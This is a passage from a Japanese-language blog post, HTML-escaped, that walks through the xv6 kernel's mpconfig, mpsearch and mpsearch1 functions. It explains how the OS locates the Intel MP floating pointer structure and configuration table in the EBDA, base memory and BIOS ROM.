&lt;li&gt;MPコンフィグレーションテーブルへのポインタ&lt;/li&gt;
&lt;li&gt;その他のMP情報へのポインタ&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;MPコンフィグレーションテーブルは、xv6OSで&lt;code class=&quot;language-text&quot;&gt;mpconf&lt;/code&gt;構造体として定義されています。&lt;/p&gt;
&lt;p&gt;後述する&lt;code class=&quot;language-text&quot;&gt;mpconfig&lt;/code&gt;関数では、MPフローティングポインタ構造体を取得した後に、その情報からMPコンフィグレーションテーブルを取得する処理が定義されています。&lt;/p&gt;
&lt;p&gt;では、OSはどうやってMPフローティングポインタ構造体を見つけるのかという点ですが、Interlの仕様書によると、MPフローティングポインタ構造体は以下のいずれかに存在するよう定義されているため、OSはこれらを検索してMPフローティングポインタ構造体の有無を確認することになります。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;拡張BIOSデータ領域（EBDA）の最初の1KiB以内の領域&lt;/li&gt;
&lt;li&gt;システムベースメモリ領域の最後の1KiB以内の範囲&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;0x0F0000&lt;/code&gt;から&lt;code class=&quot;language-text&quot;&gt;0x0FFFFFF&lt;/code&gt;の間のBIOS ROMアドレス空間&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;xv6OSでも、&lt;code class=&quot;language-text&quot;&gt;mpsearch&lt;/code&gt;関数と&lt;code class=&quot;language-text&quot;&gt;mpsearch1&lt;/code&gt;関数によって、上記の領域の探索が行われます。&lt;/p&gt;
&lt;p&gt;これらの関数については後述します。&lt;/p&gt;
&lt;p&gt;次にMPコンフィグレーションテーブルですが、これは通常オプションの設定のようです。&lt;/p&gt;
&lt;p&gt;システムがデフォルトの場合はMPコンフィグレーションテーブルの定義は不要ですが、CPUの数が変動する可能性のある場合などは必須になります。(実質的に汎用OSでは必須ってことでしょうか)&lt;/p&gt;
&lt;p&gt;MPコンフィグレーションテーブルにはAPICやプロセッサ、バス、割込みに関する設定情報が含まれます。&lt;/p&gt;
&lt;p&gt;また新しくAPICという単語がでてきましたが、これはIntelのマルチプロセッサCPUで使用される割込み制御の機構です。&lt;/p&gt;
&lt;p&gt;APICについてはxv6OSで割込みコントローラを設定するときに詳しく見ていこうと思います。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://wiki.osdev.org/APIC&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;APIC - OSDev Wiki&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;MP仕様についてはWEBページや書籍からはあまり有益な情報が得られなかったので、詳しく知るにはIntelの仕様書を読むのが一番早いと思います。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.manualslib.com/manual/77733/Intel-Multiprocessor.html?page=37#manual&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Chapter 4 Mp Configuration Table; Mp Configuration Data Structures - Intel MultiProcessor Specification [Page 37] | ManualsLib&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;mpフローティングポインタ構造体の取得&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#mp%E3%83%95%E3%83%AD%E3%83%BC%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0%E3%83%9D%E3%82%A4%E3%83%B3%E3%82%BF%E6%A7%8B%E9%80%A0%E4%BD%93%E3%81%AE%E5%8F%96%E5%BE%97&quot; aria-label=&quot;mpフローティングポインタ構造体の取得 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;MPフローティングポインタ構造体の取得&lt;/h3&gt;
&lt;p&gt;というわけでさっそく以下のコードを見ます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;conf &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mpconfig&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;mp&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Expect to run on an SMP&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;mpconfig&lt;/code&gt;関数の引数として&lt;code class=&quot;language-text&quot;&gt;mp&lt;/code&gt;構造体を与え、戻り値を&lt;code class=&quot;language-text&quot;&gt;mpconf&lt;/code&gt;構造体の変数である&lt;code class=&quot;language-text&quot;&gt;conf&lt;/code&gt;に格納しています。&lt;/p&gt;
&lt;p&gt;ここでは、&lt;code class=&quot;language-text&quot;&gt;mpconf&lt;/code&gt;構造体の変数&lt;code class=&quot;language-text&quot;&gt;conf&lt;/code&gt;を初期化するとともに、システムがSMPで動作しているかをチェックします。&lt;/p&gt;
&lt;p&gt;SMPとは、&lt;code class=&quot;language-text&quot;&gt;Symmetric multiprocessing&lt;/code&gt;あるいは&lt;code class=&quot;language-text&quot;&gt;shared-memory multiprocessing&lt;/code&gt;の略称で、要するに複数のCPUがメモリリソースを共有するマルチプロセッサシステムを意味しています。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://en.wikipedia.org/wiki/Symmetric_multiprocessing&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Symmetric multiprocessing - Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://wiki.osdev.org/Symmetric_Multiprocessing&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Symmetric Multiprocessing - OSDev Wiki&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;一旦&lt;code class=&quot;language-text&quot;&gt;mpconfig&lt;/code&gt;関数のソースコードを見てみましょう。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;mpconfig&lt;/code&gt;関数は、&lt;code class=&quot;language-text&quot;&gt;mpinit&lt;/code&gt;関数で宣言した&lt;code class=&quot;language-text&quot;&gt;mp&lt;/code&gt;構造体オブジェクトのアドレスを引数として、&lt;code class=&quot;language-text&quot;&gt;mpconf&lt;/code&gt;構造体を戻り値とする関数です。&lt;/p&gt;
&lt;p&gt;この関数によってMPテーブルが検索され、引数として受け取った&lt;code class=&quot;language-text&quot;&gt;mp&lt;/code&gt;構造体オブジェクトと戻り値の&lt;code class=&quot;language-text&quot;&gt;mpconf&lt;/code&gt;構造体の初期化が行われます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Search for an MP configuration table.  For now,&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// don&apos;t accept the default configurations (physaddr == 0).&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// Check for correct signature, calculate the checksum and,&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// if correct, check the version.&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// To do: check extended table checksum.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mpconf&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mpconfig&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mp&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;pmp&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mpconf&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;conf&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mp&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;mp&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;mp &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mpsearch&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; mp&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;physaddr &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  conf &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mpconf&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;P2V&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; mp&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;physaddr&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;memcmp&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;conf&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;PCMP&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;conf&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;version &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; conf&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;version &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uchar&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;conf&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; conf&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;length&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;pmp &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; mp&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; conf&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;mp&lt;/code&gt;構造体は前述したMPフローティングポインタ構造体を指します。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;mpconfig&lt;/code&gt;関数が呼び出された時点ではまだシステムのMPフローティングポインタ構造体は取得できていないので、まずMPフローティングポインタ構造体を探索する必要があります。&lt;/p&gt;
&lt;p&gt;このために呼び出されるのが&lt;code class=&quot;language-text&quot;&gt;mpsearch&lt;/code&gt;関数と&lt;code class=&quot;language-text&quot;&gt;mpsearch1&lt;/code&gt;関数です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Look for an MP structure in the len bytes at addr.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mp&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mpsearch1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint a&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; len&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  uchar &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;e&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;p&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;addr&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  addr &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;P2V&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;a&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  e &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; addr&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;len&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;p &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; addr&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; p &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; p &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mp&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;memcmp&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;p&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;_MP_&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;p&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mp&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mp&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;p&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// Search for the MP Floating Pointer Structure, which according to the&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// spec is in one of the following three locations:&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// 1) in the first KB of the EBDA;&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// 2) in the last KB of system base memory;&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// 3) in the BIOS ROM between 0xE0000 and 0xFFFFF.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mp&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mpsearch&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  uchar &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;bda&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uint p&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mp&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;mp&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  bda &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uchar &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;P2V&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x400&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;p &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;bda&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x0F&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; bda&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x0E&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;mp &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mpsearch1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;p&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; mp&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    p &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;bda&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x14&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;bda&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x13&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;mp &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mpsearch1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;p&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; mp&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
